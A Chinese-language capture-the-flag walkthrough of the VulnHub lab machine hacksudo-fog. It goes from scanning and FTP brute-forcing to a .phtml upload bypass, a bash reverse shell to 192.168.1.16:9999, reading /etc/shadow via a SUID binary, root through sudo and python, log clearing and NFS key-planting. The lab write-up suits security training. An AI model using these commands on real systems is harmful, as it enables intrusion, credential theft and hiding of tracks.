# 前言

靶机：`hacksudo-fog`

攻击：`kali`

都是采用虚拟机，网卡为桥接模式

# 主机发现

使用`arp-scan -l`或者`netdiscover -r 192.168.1.1/24`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\1.jpg)

# 信息收集

## 使用nmap进行扫描

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\2.jpg)

因为发现有些端口不是常用的，所以采用扫描全部端口再扫描一次

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\3.jpg)

## 网站收集

访问80端口服务

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\4.jpg)

查看页面源代码，可以看到大概率是目录型网站

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\5.jpg)

访问`index1.html`，可以看到是一张图片

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\6.jpg)

访问页面源代码，看到一张图片的链接，以及一段提示，说是`caesar`密码，并给出一个链接地址，一个作者名，收集起来

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\6-1.jpg)

访问链接地址，是一个项目

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\6-2.jpg)

查看说明，好家伙是音频隐写，不过这个项目中的音频明显是测试使用的，文件名都是`demo`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\6-3.jpg)





扫描网站的目录

使用`gobuster、dirb、dirsearch、dirbuster、ffuf`等工具

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\7.jpg)

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\8.jpg)



访问`cms`，发现其在加载时，一直是连接某个IP地址

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\9.jpg)

不过在扫描的时候，发现扫描`cms`一直停留在目录，并没有文件出来，测试这个目录试试

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\9-1.jpg)

逐个访问，发现`admin`有个登录，尝试测试后，弱密码不行，万能密码也不行，暂时搁置

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\9-2.jpg)

对这个`cms`进行指纹识别，发现版本等

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\9-3.jpg)

搜索有无漏洞，发现有，暂时先不用，看能否继续收集到信息

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\9-4.jpg)

访问`dict.txt`，给出的字典，估计可能会爆破

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\10.jpg)

# 漏洞寻找

## 解密

到这里基本上已经信息收集差不多，不过在`80`端口也未发现有漏洞

尝试使用`fpt`的匿名登录，无密码是不能登录，或者未开启匿名登录

尝试使用获取到的`dict.txt`和作者名`hacksudo`爆破`ftp`和`ssh`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\11.jpg)

使用`ftp`登录

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\12.jpg)



查看`flag1.txt`文件，然后切换到目录后，查看`authors.txt`，发现其中的一个名称`vishal waghmare`，以及一个压缩包，把这个压缩包下载到`kali`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\13.jpg)



尝试解压，发现需要密码

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\14.jpg)

使用`fcrackzip`或者使用`john`的套件进行破解，先使用`zip2john`转换，然后`john`破解

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\15.jpg)

查看解压后的文件

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\16.jpg)

这个`wav`音频文件，啧，想起前面那个项目，把其脚本下载，然后查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\17.jpg)

使用`exwave.py`尝试能否提取信息

```shell
python3 ExWare.py -f ../hacksudoSTEGNO.wav
```

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\18.jpg)

这一串串字符，在之前的`index1.html`源代码中，也是看到说是`caesar`加密，去在线网站进行解密，看到一个最像的，包含用户名密码

```
XYZABCDEFGHIJKLMNOPQRSTUVW
ABCDEFGHIJKLMNOPQRSTUVWXYZ
wwww.localhost/fog Username=fog:password=hacksudoISRO
```



![](D:\stu\vulnhub\hacksudo靶场\pic-fog\19.jpg)

## 反弹shell

这个还给出网址，估计可能是用于网站登录的，访问`cms/admin`，使用用户名密码登录，登录成功

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\20.jpg)

在这个界面点击各种模块进行测试，虽说用户界面有两个用户，一个`fog`，一个`hacksudo`，但是这里并不显示`hacksudo`的密码，最终发现文件管理处，可以上传文件到`/uploads`目录，并且该目录下的一个`txt`文件，有脚本语言`php`写的命令。

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\21.jpg)

![22](D:\stu\vulnhub\hacksudo靶场\pic-fog\22.jpg)

直接对该文件进行修改，不过这里对于文件类型做了限制，直接改为`php、php5`等可能不行，这里测试到`phtml`后发现可以，并且可以被解析成脚本语言

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\23.jpg)

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\24.jpg)

测试使用`bash`命令看能否进行反弹

```shell
bash -c 'bash -i >& /dev/tcp/192.168.1.16/9999 0>&1'
//进行URL编码
bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0%3e%261%27%0a
```

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\25.jpg)

# 提取

## 内网信息收集

查看之前在`cms`目录下的`config.php`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\26.jpg)

在查看目录时，发现一个`flag`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\27.jpg)

尝试使用上面的数据库连接的用户名和密码进行登录测试

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\28.jpg)

查询该数据库下的表时，发现`users`，直接查询其中的数据

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\29.jpg)

这里看到，`hacksudo`的密码是与`fog`一样的，不过也只能登录网站，且权限不如`fog`

一圈搜索，寻找具有SUID权限文件，发现`look`，之前碰到过，`look`可以读取数据，这个具有SUID的话，就可以读取之前不能读取的数据

```shell
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\30.jpg)

可以在网站`gtfobins.github.io`查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\31.jpg)

使用`look`查看`/etc/shadow`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\32.jpg)

## 密码hash破解

当然这里也可以查看`/etc/passwd`，然后把两个文件下载到`kali`，或者 把文件内容复制到`kali`，使用`unshadow`整合在一起，再使用`john`破解即可

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\33.jpg)

很快破解`isro`的密码`qwerty`

使用`ssh`登录到`isro`用户

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\34.jpg)

获取到一个加密的字符，尝试使用`md5`解密，发现是`vishal`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\35.jpg)

## python提取至root

使用`find`寻找具有SUID权限的文件，发现`sudo`，使用`sudo -l`列出

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\36.jpg)

发现整个`isro`目录下都可以，那么就查看其中有什么门道，发现在其`/fog`目录下，有一个文件的所有者是`root`，测试该文件，发现是`python2`

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\37.jpg)

使用`python`提取

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\38.jpg)

![39](D:\stu\vulnhub\hacksudo靶场\pic-fog\39.jpg)





# 清除痕迹

清理日志

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\40.jpg)

![41](D:\stu\vulnhub\hacksudo靶场\pic-fog\41.jpg)



把之前修改的文件改回去

![42](D:\stu\vulnhub\hacksudo靶场\pic-fog\42.jpg)





# 总结

1. 目录扫描全面，所有的子级目录也是不能忽略的
2. 对于一些CMS有一定的了解，这里的CMS其实就是有可利用的漏洞，可以复现的
3. 信息收集的所有东西，可能都是有用的，这里就是通过收集到的信息，组成密码，对ftp爆破
4. 一定要记得查看页面源代码
5. 对于使用`find`寻找具有SUID权限的文件，方式不止一种
6. 即便通过`sudo -l`列出了一些文件，自己也要去分别，文件的所有者，是否能够达到提取





这里忽略一点，因为开启了`rpcbind`和`nfs`服务，虽然这里无法使用，但还是要进行一个说明

使用`nmap`可以先进行探索，探索目标的`rpc`信息

```shell
nmap -p 111 --script=rpcinfo 192.168.1.50
```



![](D:\stu\vulnhub\hacksudo靶场\pic-fog\43.jpg)

然后使用脚本探测，有无可用的`mount`

```shell
nmap --script=nfs-* 192.168.1.50
```



![](D:\stu\vulnhub\hacksudo靶场\pic-fog\44.jpg)

这里是提示没有可用的，如果这里是有可用的，就可以使用命令`showmount`查看有哪些目录可以

![](D:\stu\vulnhub\hacksudo靶场\pic-fog\45.jpg)

如果根目录可以的话，就可以把目标的`nfs`通过命令`mount`挂载到本地，并且挂载的是有同步性的。

所以这里就可以通过在`kali`中生成一个`ssh`的公私钥文件，然后把这个公钥文件给复制替换到原本的公钥文件，就可以达到无密码登录，也就是一个所谓的方式





















